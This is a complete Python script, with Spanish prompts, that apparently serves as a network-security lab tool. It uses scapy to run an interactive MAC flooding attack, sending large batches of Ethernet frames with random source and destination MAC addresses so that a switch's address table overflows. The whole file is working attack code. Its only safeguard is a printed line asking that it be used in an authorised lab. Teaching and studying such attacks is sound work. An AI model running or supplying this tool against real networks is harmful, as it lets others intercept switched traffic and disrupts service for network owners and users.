import os
import random
import signal
import subprocess
import sys
import time

from scapy.all import Ether, Raw, conf, get_if_hwaddr, sendp

running = True


def stop_handler(sig, frame):
    global running
    running = False


signal.signal(signal.SIGINT, stop_handler)
signal.signal(signal.SIGTERM, stop_handler)


def require_root():
    if hasattr(os, "geteuid") and os.geteuid() != 0:
        print("Ejecuta este script con sudo")
        sys.exit(1)


def run_cmd(cmd):
    try:
        return subprocess.check_output(cmd, text=True, stderr=subprocess.DEVNULL).strip()
    except Exception:
        return ""


def list_interfaces():
    return [iface for iface in sorted(os.listdir("/sys/class/net")) if iface != "lo"]


def get_interface_info(iface):
    info = run_cmd(["ip", "-br", "addr", "show", iface])
    return info if info else iface


def choose_interface():
    interfaces = list_interfaces()

    if not interfaces:
        print("No se encontraron interfaces de red")
        sys.exit(1)

    print("")
    print("Interfaces disponibles:")
    print("")

    for index, iface in enumerate(interfaces, 1):
        print(f"{index}. {get_interface_info(iface)}")

    print("")

    default_iface = "eth0" if "eth0" in interfaces else interfaces[0]

    while True:
        value = input(f"Interfaz conectada al switch [Enter = {default_iface}]: ").strip()

        if value == "":
            return default_iface

        if value.isdigit():
            number = int(value)

            if 1 <= number <= len(interfaces):
                return interfaces[number - 1]

        if value in interfaces:
            return value

        print("Interfaz inválida")


def ask_int(label, default_value, minimum, maximum):
    while True:
        value = input(f"{label} [Enter = {default_value}]: ").strip()

        if value == "":
            return default_value

        try:
            number = int(value)
        except Exception:
            print("Valor inválido")
            continue

        if minimum <= number <= maximum:
            return number

        print(f"El valor debe estar entre {minimum} y {maximum}")


def ask_float(label, default_value, minimum, maximum):
    while True:
        value = input(f"{label} [Enter = {default_value}]: ").strip()

        if value == "":
            return default_value

        try:
            number = float(value)
        except Exception:
            print("Valor inválido")
            continue

        if minimum <= number <= maximum:
            return number

        print(f"El valor debe estar entre {minimum} y {maximum}")


def ask_confirm():
    print("")
    value = input("Escribe s para iniciar el ataque en el laboratorio: ").strip().lower()
    return value == "s"


def random_mac():
    mac = [
        0x02,
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
    ]

    return ":".join(f"{byte:02x}" for byte in mac)


def random_payload(size):
    return bytes(random.getrandbits(8) for _ in range(size))


def build_packet(payload_size):
    src_mac = random_mac()
    dst_mac = random_mac()

    packet = (
        Ether(src=src_mac, dst=dst_mac, type=0x0800)
        / Raw(load=random_payload(payload_size))
    )

    return packet, src_mac, dst_mac


def main():
    require_root()

    print("")
    print("MAC Flooding interactivo")
    print("Usar solamente en laboratorio autorizado")
    print("")

    iface = choose_interface()
    count = ask_int("Cantidad de tramas a enviar", 10000, 1, 1000000)
    batch_size = ask_int("Tamaño de lote por envío", 100, 1, 5000)
    payload_size = ask_int("Tamaño del payload en bytes", 46, 1, 1400)
    interval = ask_float("Pausa entre lotes en segundos", 0.01, 0, 10)

    try:
        real_mac = get_if_hwaddr(iface)
    except Exception:
        real_mac = "desconocida"

    conf.iface = iface
    conf.verb = 0

    print("")
    print("Configuración seleccionada:")
    print(f"Interfaz: {iface}")
    print(f"Info interfaz: {get_interface_info(iface)}")
    print(f"MAC real atacante: {real_mac}")
    print(f"Tramas totales: {count}")
    print(f"Lote: {batch_size}")
    print(f"Payload: {payload_size} bytes")
    print(f"Pausa entre lotes: {interval}")

    if not ask_confirm():
        print("Cancelado")
        sys.exit(0)

    print("")
    print("Ataque iniciado")
    print("Presiona Ctrl+C para detener")
    print("")

    sent = 0
    start_time = time.time()

    while running and sent < count:
        remaining = count - sent
        current_batch = min(batch_size, remaining)
        packets = []

        for _ in range(current_batch):
            packet, src_mac, dst_mac = build_packet(payload_size)
            packets.append(packet)

        sendp(packets, iface=iface, verbose=False)

        sent += current_batch
        elapsed = time.time() - start_time
        pps = sent / elapsed if elapsed > 0 else 0

        print(f"Enviadas={sent}/{count} velocidad={pps:.1f} pps")

        if interval > 0:
            time.sleep(interval)

    elapsed = time.time() - start_time
    pps = sent / elapsed if elapsed > 0 else 0

    print("")
    print("Resumen:")
    print(f"Tramas enviadas: {sent}")
    print(f"Tiempo total: {elapsed:.2f} segundos")
    print(f"Velocidad promedio: {pps:.1f} pps")
    print("")
    print("Finalizado")


if __name__ == "__main__":
    main()
